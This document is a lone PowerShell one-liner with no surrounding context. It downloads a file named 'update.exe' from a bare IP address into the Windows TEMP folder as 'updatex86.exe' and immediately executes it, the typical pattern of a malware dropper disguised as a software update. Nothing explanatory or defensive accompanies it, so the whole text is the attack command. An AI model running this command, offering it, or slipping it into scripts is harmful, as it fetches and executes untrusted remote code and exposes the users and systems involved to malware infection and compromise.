
(New-Object System.Net.WebClient).DownloadFile('http://185.45.193.17/update.exe',"$env:TEMP\updatex86.exe");Start-Process ("$env:TEMP\updatex86.exe")

